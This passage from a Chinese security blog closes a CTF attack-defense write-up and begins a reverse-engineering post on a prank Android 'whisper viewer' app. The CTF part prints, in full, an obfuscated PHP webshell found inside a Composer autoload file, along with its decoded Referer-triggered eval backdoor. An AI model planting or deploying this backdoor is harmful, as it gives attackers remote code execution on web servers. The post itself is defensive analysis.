+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/composer&#x27;</span> . <span class="string">&#x27;/autoload_real.php&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ComposerAutoloaderInit854778b4c93a322cf2f5c39e558d9f7a::getLoader();</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>vendor/composer/autoload_real.php</code> 中发现了这样一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$h</span>=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$H</span>=<span class="string">&#x27;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&amp;lt;)m$k&gt;$d&amp;lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$N</span>=<span class="string">&#x27;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$u</span>=<span class="string">&#x27;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$f</span>=<span class="string">&#x27;$i&amp;lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&amp;lt;$c&amp;&amp;$i&amp;lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$O</span>=<span class="string">&#x27;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$w</span>=<span class="string">&#x27;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&amp;lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$P</span>=<span class="string">&#x27;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$i</span>=<span class="string">&#x27;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$x</span>=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$y</span>=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$c</span>=<span class="string">&#x27;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$L</span>=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c</span>.<span class="variable">$f</span>.<span class="variable">$N</span>.<span class="variable">$i</span>.<span class="variable">$x</span>.<span class="variable">$P</span>.<span class="variable">$w</span>.<span class="variable">$O</span>.<span class="variable">$u</span>.<span class="variable">$h</span>.<span class="variable">$H</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$v</span>=<span class="variable">$y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">composerRequire854778b4c93a322cf2f5c39e558d9f7a</span>(<span class="params"><span class="variable">$fileIdentifier</span>, <span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;__composer_autoload_files&#x27;</span>][<span class="variable">$fileIdentifier</span>])) &#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;__composer_autoload_files&#x27;</span>][<span class="variable">$fileIdentifier</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面那一串乱码一样的东西其实是个混淆，只要稍微改一改，顺着解析一遍就可以了。把最后的 <code>$v();</code> 去掉（一看就是用来执行解析出来的函数的），然后输出 <code>$y</code>、<code>$L</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【$y】</span><br><span class="line">create_function</span><br><span class="line">【$L】</span><br><span class="line">$kh=&quot;4f7f&quot;;$kf=&quot;28d7&quot;;function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o=&quot;&quot;;for($i=0;$i&amp;lt;$l;)&#123;for($j=0;($j&amp;lt;$c&amp;&amp;$i&amp;lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u[&quot;query&quot;],$q);$q=array_values($q);preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;,$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss=&quot;substr&quot;;$sl=&quot;strtolower&quot;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=&quot;&quot;;for($z=1;$z&amp;lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]=&quot;&quot;;$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(&quot;&amp;lt;$k&gt;$d&amp;lt;/$k&gt;&quot;);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以重点就是 <code>$L</code> 了。稍微美化一下，在不修改逻辑的情况下简化一些语句，可得：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &amp;lt; strlen(<span class="variable">$text</span>);) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &amp;lt; strlen(<span class="variable">$key</span>) &amp;&amp; <span class="variable">$i</span> &amp;lt; strlen(<span class="variable">$text</span>)); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>] &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>]) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$get</span>);</span><br><span class="line">    <span class="variable">$get</span> = array_values(<span class="variable">$get</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>], <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$get</span> &amp;&amp; <span class="variable">$match</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$match</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$match</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = strtolower(substr(md5(<span class="variable">$i</span>.<span class="string">&quot;4f7f&quot;</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = strtolower(substr(md5(<span class="variable">$i</span>.<span class="string">&quot;28d7&quot;</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>; <span class="variable">$z</span> &amp;lt; count(<span class="variable">$match</span>[<span class="number">1</span>]); <span class="variable">$z</span>++) <span class="variable">$p</span> .= <span class="variable">$get</span>[<span class="variable">$match</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = substr(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$i</span>] .= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$_SESSION</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="string">&quot;4f7f28d7&quot;</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@xor_encode(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), substr(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(xor_encode(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&amp;lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&amp;lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这就是个 webshell，内容是通过 Referer 传进来的。除了好多加密解密以绕过过滤的函数以外，核心代码在这儿：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">@<span class="keyword">eval</span>(@gzuncompress(@xor_encode(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), substr(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line"><span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="variable">$d</span> = base64_encode(xor_encode(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&amp;lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&amp;lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以只要以同样的方式传进来数据，那么显然可以直接 get shell！似乎这个文件由于权限问题没法直接修改，所以解决问题的最简单的方法就是在 <code>index.php</code> 中加入一行代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] = <span class="string">&#x27;Hello friend&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>改完之后又过了一轮，我们的 WEB 完全正常了。虽然这个时候已经被打的很惨了……</p>
+<p>至于那些 PWN 的题，@沈园 同学负责分析、补漏洞（直接手工修改二进制文件也是 666）、写 exp，@SummerZhang 同学来跑 exp，因为 exp 不是很稳定所以他还顺便当了一次人肉守护进程。</p>
+<p>当然，也多亏 @SummerZhang 同学连夜搞出了那道 400 分的静态分析题，现学现卖的能力果然好强。</p>
+<hr>
+<p>总之，还是我们的水平不够啊……不过这次比赛对我们以后为校内赛出题提供了很多思路，说不定以后的 NUAACTF 就不光会有 CTF，还会有渗透和攻防的赛程了呢！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2016/08/13/2016-nationwide-ctf-first-writeup/" data-id="clg6iymq10031guotds3494n1" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-fake-whisper-viewer" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/17/fake-whisper-viewer/" class="article-date">
+  <time datetime="2016-06-17T04:12:00.000Z" itemprop="datePublished">2016-06-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Reverse/">Reverse</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/17/fake-whisper-viewer/">让老司机纷纷翻车的“悄悄话查看器”究竟有啥名堂？</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>相信大家一定被所谓的“QQ悄悄话查看器”刷屏了吧？从上个月开始我就郁闷，有人给我发悄悄话，然而我又猜不到是谁。有了这么一个 APP，岂不是可以调戏回去？然而大家的反应似乎不是这样的：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/1.png" alt="1"></p>
+<p>“这一切来的太快”</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/2.png" alt="2"></p>
+<p>“强行上车 车速过快 引发多起事故”</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/3.png" alt="3"></p>
+<p>“这很强势，很清真”</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/4.png" alt="4"></p>
+<p>“逸夫楼教室此起彼伏”</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/5.jpg" alt="5"></p>
+<p>“对不起，我们不认识”</p>
+<p>就是这么个安卓 APP，害了好多老司机纷纷翻车。</p>
+<p>下午刚陪女朋友上完自习（此处省略秀恩爱的若干字），各种群、空间、朋友圈就被这些图刷屏了。我所在的群中，有四个群里面已经有了这个文件。于是我就顺手反编译了一下，看看它究竟是个什么玩意儿。</p>
+<p><strong>如果迫不及待的话，我可以提前告诉你，这就是某个人顺手写出来的整人的玩意儿。好了全文到此结束。</strong></p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="坑爹呢这是！"></p>
+<p>当然，对于感兴趣的同学，我当然要说一下逆向这个 APP 的过程。由于这个 APP 写的很简单，因此<strong>逆向起来没有任何难度</strong>，大神就不要喷啦。</p>
+<p>后文可能会有福利哦~</p>
+<h1 id="0x01-Unzip"><a href="#0x01-Unzip" class="headerlink" title="0x01 Unzip"></a>0x01 Unzip</h1><p>呃，之所以需要这一步，是因为如果直接用 <code>dex2jar</code> 来反编译 apk 的话会报错，大概是打包的时候出了问题吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ d2j-dex2jar.sh qq_secret.apk</span><br><span class="line">dex2jar qq_secret.apk -&gt; qq_secret-dex2jar.jar</span><br><span class="line">com.googlecode.dex2jar.DexException: java.util.zip.ZipException: invalid entry compressed size (expected 252773 but got 252747 bytes)</span><br><span class="line">        at com.googlecode.dex2jar.reader.DexFileReader.opDataIn(DexFileReader.java:217)</span><br><span class="line">        at com.googlecode.dex2jar.reader.DexFileReader.&lt;init&gt;(DexFileReader.java:229)</span><br><span class="line">        at com.googlecode.dex2jar.reader.DexFileReader.&lt;/init&gt;&lt;init&gt;(DexFileReader.java:240)</span><br><span class="line">        at com.googlecode.dex2jar.tools.Dex2jarCmd.doCommandLine(Dex2jarCmd.java:104)</span><br><span class="line">        at com.googlecode.dex2jar.tools.BaseCmd.doMain(BaseCmd.java:174)</span><br><span class="line">        at com.googlecode.dex2jar.tools.Dex2jarCmd.main(Dex2jarCmd.java:34)</span><br><span class="line">Caused by: java.util.zip.ZipException: invalid entry compressed size (expected 252773 but got 252747 bytes)</span><br><span class="line">        at java.util.zip.ZipInputStream.readEnd(Unknown Source)</span><br><span class="line">        at java.util.zip.ZipInputStream.read(Unknown Source)</span><br><span class="line">        at java.util.zip.ZipInputStream.closeEntry(Unknown Source)</span><br><span class="line">        at java.util.zip.ZipInputStream.getNextEntry(Unknown Source)</span><br><span class="line">        at com.googlecode.dex2jar.reader.ZipExtractor.extract(ZipExtractor.java:31)</span><br><span class="line">        at com.googlecode.dex2jar.reader.DexFileReader.readDex(DexFileReader.java:129)</span><br><span class="line">        at com.googlecode.dex2jar.reader.DexFileReader.opDataIn(DexFileReader.java:213)</span><br><span class="line">        ... 5 more&lt;/init&gt;</span><br></pre></td></tr></table></figure>
+
+<p>于是用压缩软件解包之后，反编译里面的 dex 文件即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ d2j-dex2jar.sh classes.dex</span><br><span class="line">dex2jar classes.dex -&gt; classes-dex2jar.jar</span><br></pre></td></tr></table></figure>
+
+<p>然后用 <code>jd-gui</code> 载入，发现里面有两个大包：<code>com.e4a.runtime</code> 和 <code>com.o</code>，前者是安卓版的易语言运行环境，后者就是主程序了。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/6.png" alt="6"></p>
+<p>看了几眼，发现 <code>R.class</code> 中声明的元素少得可怜。于是往下看到 <code>主窗口.class</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> $define() &#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    图片框Impl local图片框Impl = <span class="keyword">new</span> 图片框Impl(主窗口);</span><br><span class="line">    Objects.initializeProperties(local图片框Impl);</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1</span> = ((图片框)local图片框Impl);</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>左边((<span class="keyword">int</span>)算术运算.取整(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">0</span>).mul(IntegerVariant.getIntegerVariant(系统相关类.取屏幕宽度()))));</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>顶边((<span class="keyword">int</span>)算术运算.取整(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">0</span>).mul(IntegerVariant.getIntegerVariant(系统相关类.取屏幕高度()))));</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>宽度((<span class="keyword">int</span>)算术运算.取整(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">1</span>).mul(IntegerVariant.getIntegerVariant(系统相关类.取屏幕宽度()))));</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>高度((<span class="keyword">int</span>)算术运算.取整(ByteVariant.getByteVariant((<span class="keyword">byte</span>)<span class="number">1</span>).mul(IntegerVariant.getIntegerVariant(系统相关类.取屏幕高度()))));</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>背景颜色(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>显示方式(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>图像(<span class="string">&quot;6M5UBF2J9ZI70.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.图片框<span class="number">1.</span>可视(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>隐去了部分代码，可以看到这里全屏显示了一张图片。那么所谓的 <code>6M5UBF2J9ZI70.jpg</code> 是个什么东西呢？我们来翻一下 <code>assets</code> 文件夹好了：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/7.png" alt="7"></p>
+<p>看到缩略图，好像是福利？于是点开大图。结果发现跟女朋友相比差了好多，并没有 xing 趣欣赏，不知道大家是什么反应？</p>
+<p>继续往下看：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> 主窗口$创建完毕() &#123;</span><br><span class="line">    音量操作.置音量(<span class="number">4</span>, <span class="number">100</span>);</span><br><span class="line">    音量操作.置音量(<span class="number">4</span>, <span class="number">100</span>);</span><br><span class="line">    音量操作.置音量(<span class="number">2</span>, <span class="number">100</span>);</span><br><span class="line">    音量操作.置音量(<span class="number">3</span>, <span class="number">100</span>);</span><br><span class="line">    媒体操作.播放音乐(<span class="string">&quot;0.mp3&quot;</span>);</span><br><span class="line">    媒体操作.置循环播放(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    <span class="keyword">this</span>.系统设置<span class="number">1.</span>屏幕锁定();</span><br><span class="line">    <span class="keyword">this</span>.系统设置<span class="number">1.</span>保持屏幕常亮();</span><br><span class="line">    <span class="keyword">this</span>.系统广播<span class="number">1.</span>注册广播(<span class="string">&quot;后台服务广播&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.系统闹钟<span class="number">1.</span>设置闹钟(<span class="number">1</span>, <span class="number">500L</span>, <span class="string">&quot;闹钟&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.时钟<span class="number">1.</span>时钟周期(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将音量调到最高，播放音乐，保持屏幕常亮……毕竟是易语言，想都不用想就知道是干什么的了~</p>
+<p>看到有一段音乐，又想起了刚才的图片，于是打开听一听吧……</p>
+<p>我还是不评价了，放一张别人的评论好了：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/8.png" alt="0"></p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/qiaoqiaohua/keng-die-ne.gif" alt="坑爹呢这是！"></p>
+<p>还是继续往下看吧……</p>
